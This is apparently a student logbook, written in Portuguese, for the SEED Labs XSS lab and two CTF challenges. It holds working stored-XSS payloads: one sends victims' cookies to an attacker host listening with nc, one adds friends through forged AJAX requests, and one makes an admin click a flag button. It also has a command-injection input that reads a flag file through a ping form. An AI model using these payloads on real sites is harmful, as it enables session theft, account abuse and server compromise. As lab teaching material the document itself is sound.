# SEED Labs - Cross-Site Scripting (XSS) Attack Lab

## Preparation: Getting Familiar with the "HTTP Header Live" tool

Utilizou-se a ferramenta `"HTTP Header Live"` para capturar e analisar pedidos HTTP, em particular, o pedido que é feito quando um utilizador (neste caso Alice) clica no botão `Add friend` no perfil de `Samy`, ou seja, quando se adiciona `Samy` à lista de amigos. O pedido HTTP capturado encontra-se abaixo. Este será útil na `task 4`.

![](./screenshots/logbook10_task0.png) 

```
http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1670606154&__elgg_token=FFMYbLmKbNuV0PqhQnzMgQ&__elgg_ts=1670606154&__elgg_token=FFMYbLmKbNuV0PqhQnzMgQ
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.seed-server.com/profile/samy
Cookie: Elgg=6ci56crsicjs6buh3fjo2pf68o
```

## Task 1: Posting a Malicious Message to Display an Alert Window

Depois de fazer _log in_ como Samy (username **samy** e password **seedsamy**) por exemplo, tal como é sugerido no guião, colocou-se o seguinte código JavaScript no campo `Brief description` do seu perfil. Outro campo do perfil onde é esperado _input_ do utilizador, por exemplo `Location`, seria válido, porque não é apenas no campo `Brief description` que o _input_ do utilizador não é devidamente tratado.

```html
<script>alert('XSS');</script>
```

![](./screenshots/logbook10_task1_1.png)

Tal como era esperado, sempre que um utilizador visita o perfil de `Samy` o código é executado e uma janela de alerta é exibida. 

![](./screenshots/logbook10_task1_2.png) 

## Task 2: Posting a Malicious Message to Display Cookies

Muito semelhante à `task 1`. Tal como é sugerido no guião, substitui-se o código JavaScript da `task 1` pelo seguinte: 

```html
<script>alert(document.cookie);</script>
```

![](./screenshots/logbook10_task2_1.png) 

Tal como era esperado, sempre que um utilizador visita o perfil de `Samy` (neste caso), o código é executado e uma janela de alerta é exibida com as cookies do próprio utilizador. 

![](./screenshots/logbook10_task2_2.png) 

## Task 3: Stealing Cookies from the Victim’s Machine

Na `task 2` apenas o utilizador visualizava as suas _cookies_. Para o atacante ter acesso às mesmas é necessário modificar o código JavaScript, como é sugerido no guião, para o seguinte:

```html
<script>document.write('<img src=http://10.9.0.1:5555?c='
                       + escape(document.cookie) + '   >');
</script>
```

- Nota: A explicação do código acima foi omitida, uma vez que, a mesma já se encontra no guião.

![](./screenshots/logbook10_task3.png) 

De modo a ficar à escuta na porta 5555 e imprimir o pedido HTTP GET com as _cookies_, utilizou-se o comando `nc -lknv 5555`, cujo _output_ foi o seguinte:

```sh
[12/09/22]seed@VM:~/.../Labsetup$ nc -lknv 5555
Listening on 0.0.0.0 5555
Connection received on 10.0.2.7 56350
GET /?c=Elgg%3Dlutf37jd6iap3futo623ouohpe HTTP/1.1
Host: 10.9.0.1:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.seed-server.com/profile/samy
```

É possível verificar que as _cookies_ recebidas na máquina do atacante coincidem com as que foram impressas na `task 2`.

## Task 4: Becoming the Victim’s Friend

De modo a perceber os pedidos HTTP (e os seus parâmetros) que são enviados ao servidor quando um utilizador (neste caso Alice) adiciona `Samy` à sua lista de amigos, isto é, quando clica no botão `Add friend` no perfil de `Samy`, fez-se _log in_ como Alice (username **alice** e password **seedalice**) e clicou-se no respetivo botão. O pedido HTTP capturado encontra-se na `Preparation` e foi o seguinte:

```
http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=1670606154&__elgg_token=FFMYbLmKbNuV0PqhQnzMgQ&__elgg_ts=1670606154&__elgg_token=FFMYbLmKbNuV0PqhQnzMgQ
Host: www.seed-server.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.seed-server.com/profile/samy
Cookie: Elgg=6ci56crsicjs6buh3fjo2pf68o
```

Analisando o pedido, verifica-se que o URL é `http://www.seed-server.com/action/friends/add` e o valor do parâmetro `friend` é **59** (ID de Samy), que é usado para especificar o utilizador que deve ser adicionado à lista de amigos. Existem dois parâmetros, `__elgg_ts` e `__elgg_token`, que são contramedidas contra ataques `CSRF`, cujos valores são específicos da página e devem ser definidos devidamente no código de modo a evitar que o pedido seja tratado como _cross-site request_. Esses valores estão atribuídos a duas variáveis - `elgg.security.token.__elgg_ts` e `elgg.security.token.__elgg_token`, sendo estas utilizadas no código esqueleto nas linhas assinaladas 1 e 2. 
Com esta informação é possível completar o código esqueleto fornecido no guião:

```javascript
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;

        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;

        // Construct the HTTP request to add Samy as a friend.
        var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + token + ts;

        // Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

O código acima foi colocado no campo `About me` na página do perfil de Samy usando o `Text mode`. 
Se apenas estivesse disponível o `Editor mode` continuava a ser possível lançar um ataque bem sucedido, embora fosse mais difícil - "It should be noted that even if Elgg does not provide a plaintext editor for this field, attacks can still be launched, although they will be slightly more difficult. For example, an attacker can use a browser extension to remove those formatting data from HTTP requests, or simply sends out requests using a customized client, instead of using browsers."  

Fonte: 
- SEED book (11.2.2 Use XSS Attacks to Befriend with Others) 

![](./screenshots/lobook10_task4_1.png) 

De modo a testar o ataque, fez-se _log in_ como Boby (username **boby** e password **seedboby**), verificou-se que não tinha nenhum amigo na sua lista de amigos - "No friends yet.", em seguida a página do perfil de Samy foi visitada e automaticamente este foi adicionado à sua lista, mesmo não tendo clicado no botão `Add friend`.

![](./screenshots/lobook10_task4_2.png) 
![](./screenshots/lobook10_task4_3.png) 

Tal como era esperado, sempre que um utilizador visita o perfil de `Samy`, o código é executado e `Samy` é adicionado à lista de amigos desse utilizador. 

- Nota: As perguntas 1 e 2 foram respondidas ao longo da explicação da task.

# CTF - Semanas 10 e 11

## Desafio 1

Ao entrar na página web, deparamo-nos com um form simples onde podemos inserir texto, que depois pode ser visto pelo administrador.

![img](screenshots/apply_flag1.PNG)  

![img](screenshots/apply_flag2.PNG)

Se o input do form não for *sanitized*, então esta página fica vulnerável a um ataque XSS, uma vez que é possível colocar uma tag `<script>` no código html da página.

O objetivo é fazer o administrador clicar no botão "Give the flag", uma vez que o utilizador não autenticado não tem permissões para o fazer (mesmo que não esteja `disabled`)

```html
<form method="POST" action="" role="form">
    <div class="submit">     
        <input type="submit" id="giveflag" value="Give the flag" disabled="">      
    </div>
</form>
```

Então, vamos utilizar um script que realize essa ação ao carregar a página, de modo a que seja feito do lado do administrador.

```html
<script> window.onload = function(){document.getElementById('giveflag').click();} </script>
```

![img](screenshots/apply_flag3.PNG)  

![img](screenshots/apply_flag4.PNG)


## Desafio 2

Ao explorar o site, encontramos algumas funcionalidades disponíveis a um utilizador não autenticado, que podemos tentar explorar. Nomeadamente, existe uma funcionalidade que nos permite testar a nossa ligação a um ip específico.

![img](screenshots/ping1.PNG) 

Pela forma como é feito, percebemos que é usado o comando linux `ping`, ou seja, existe uma shell de linux a correr no servidor, à qual temos acesso. Sabendo pelo enunciado que a flag se encontra em `/flags/flag.txt` vamos usar a shell para imprimir o conteúdo deste ficheiro, usando como input `0.0.0.0 | cat /flags/flag.txt`.

```bash
ping 0.0.0.0 | cat /flags/flag.txt
```

![img](screenshots/ping2.PNG) 


